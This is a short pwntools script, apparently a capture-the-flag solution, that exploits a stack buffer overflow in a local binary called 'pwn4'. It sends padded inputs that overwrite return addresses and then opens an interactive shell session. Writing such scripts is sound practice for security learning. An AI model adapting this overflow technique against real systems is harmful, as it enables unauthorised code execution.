from pwn import *

context(log_level="debug")
vul_addr =  0x80485fc
data_addr = 0x8049908
p = process('./pwn4')
p.recvuntil('\n')
p.sendline('a'*4+p32(vul_addr))
p.recvuntil('\n')
p.sendline('a'*0x3a+p32(data_addr))
p.interactive()